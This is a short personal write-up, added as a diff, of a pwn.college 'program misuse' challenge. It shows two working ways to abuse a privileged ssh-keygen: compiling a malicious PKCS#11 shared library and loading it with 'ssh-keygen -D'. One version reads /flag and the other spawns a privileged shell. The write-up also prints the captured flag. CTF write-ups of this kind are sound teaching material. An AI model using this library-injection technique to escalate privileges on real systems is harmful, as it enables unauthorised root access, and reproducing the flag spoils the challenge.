@@ -1,0 +1,57 @@
+# challenge: ssh-keygen
+
+📅 2025-12-21
+📁 program misuse
+
+---
+
+## ✅ what i did 
+I WAY
+-clicked start
+-opened the terminal
+-ran: 'vim bro.c'
+-typed: '#include <stdio.h>'
+        'int C_GetFunctionList()'
+        '{'
+        'FILE *fptr;'
+        'fptr = fopen("/flag", "r");'
+        'char myString[100];'
+        'fgets(myString, 100, fptr);'
+        'printf("%s", myString);'
+        'fclose(fptr);'
+        '}'
+        'int main()'
+        '{'
+        'puts("Hello");'
+        '}'
+-ran: 'gcc -fPIC -shared bro.c -o bro.so'
+-ran: 'ssh-keygen -D ./bro.so'
+-flag popped out
+
+II WAY
+-clicked start
+-opened the terminal
+-ran: 'vim bro.c'
+-typed: '#include <stdio.h>'
+        '#include <dlfcn.h>'
+        '#include <unistd.h>'
+        'static void C_GetFunctionList() __attribute__((constructor));'
+        'void C_GetFunctionList(){'
+                'printf("EUID: %d\n", geteuid());'
+                'execl("/bin/sh", "/bin/sh -p", "-p", NULL);'
+            '}'
+        'int main(){'
+                'return 0;'
+        '}'
+-ran: 'gcc -shared -o bro.so -fPIC bro.c'
+-ran: 'ssh-keygen -D ./bro.so'
+-typed: 'cat /flag'
+-flag popped out 
+
+## 🧑🏾‍🏫 what this challenge teaches u
+crazy challenge
+I WAY -> https://writeups.kunull.net/Pwn%20College/Program%20Misuse
+II WAY -> https://medium.com/@chunguss/program-misuse-challenges-writeups-part-3-7b3307a7170e
+
+## 🏁 Flag  
+pwn.college{wGYrw3Jg83zqU9-X1mk8xlVLFbY.dNTOxwCO4IDOxEzW}
